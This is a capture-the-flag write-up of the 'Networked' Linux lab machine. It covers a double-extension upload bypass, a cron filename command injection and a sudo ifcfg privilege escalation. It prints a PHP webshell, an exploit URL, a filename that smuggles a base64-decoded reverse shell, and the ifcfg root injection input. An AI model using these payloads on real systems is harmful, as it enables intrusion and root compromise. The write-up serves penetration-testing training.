#Linux #Apache #php #UploadBypass #CMDInjection #cron #ifcfg

## Overview

Networked is a medium Linux box that's a clinic in input-validation failures. The foothold is a **double-extension file upload bypass** that smuggles a PHP webshell past an image filter. Then a `cron` job's PHP source has a command-injection flaw triggered by a malicious *filename*, moving me to `guly`. Root comes from a `sudo` network-config script vulnerable to the classic ifcfg "space = command" injection.

## Recon

A `/backup` directory served a tar of the site's PHP source, invaluable, because I can read the upload filter instead of guessing it. The app exposes `/upload.php` (validated against an image-extension allowlist) and `/photos.php` (displays uploads).

## Foothold

### Double-Extension Upload Bypass

The filter checks both extension and MIME type against `.jpg/.png/.gif/.jpeg`. Pure PHP uploads failed. So I embedded a webshell inside a real PNG and named it `.php.png`:

```php
<?php system($_GET["cmd"]); ?>
```

> **Why `.php.png` works here:** the filter only checks that the name *ends* in a valid image extension and that the MIME is an image, both satisfied by a genuine PNG carrying PHP in its bytes. But Apache on this box is configured to execute anything with `.php` anywhere in the name. So the file passes validation as an image yet runs as PHP. Serving it from `/uploads` (not the rendering `/photos.php`) executes the embedded code.

```
http://10.129.217.19/uploads/10_10_14_167.php.png?cmd=id   ->   uid=48(apache)
```

A URL-encoded `mkfifo` reverse shell in the `cmd` parameter gave a shell as `apache`.

## Privilege Escalation

### Cron + Filename Command Injection → guly

A cron-run `check_attack.php` cleans the uploads directory every few minutes. Reading its source (from the backup) revealed the flaw:

```php
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
```

> **The injection:** `$value` is a *filename* from the uploads directory, interpolated unsanitized into `exec()`. Any upload whose name isn't a valid IP gets passed through. So a file *named* with shell metacharacters becomes a command when cron runs `rm` on it.

I created a file whose name is a base64-decoded reverse shell:

```sh
touch '/var/www/html/uploads/a; echo <b64-nc-shell> | base64 -d | sh; b'
```

When cron fired, the shell landed as `guly`.

### sudo ifcfg Script → Root

```sh
sudo -l
User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
```

The script writes an `ifcfg-guly` network-config file from interactive input, with only a loose regex filter that *allows spaces*.

> **The ifcfg bug ([Full Disclosure 2019](https://seclists.org/fulldisclosure/2019/Apr/24)):** in RHEL/CentOS network scripts, a config line `NAME=value` is sourced by the shell. Anything after a space in the value is executed as a command when the interface comes up. The script runs `ifup` as root (`#!/bin/bash -p` preserves privileges), so injecting `a /bin/bash` as a value spawns a root shell.

```sh
sudo /usr/local/sbin/changename.sh
interface PROXY_METHOD: a /bin/bash
# whoami
root
```

## Root

Box rooted.

## Takeaways

- **Read the source when you can.** The `/backup` tar exposed both the upload filter and the cron flaw.
- **Double extensions defeat naive upload filters** when the web server executes on a substring match.
- **Filenames are user input.** Interpolating a filename into `exec()` is command injection.
- **ifcfg values execute after a space**, a long-standing RHEL network-script privesc.
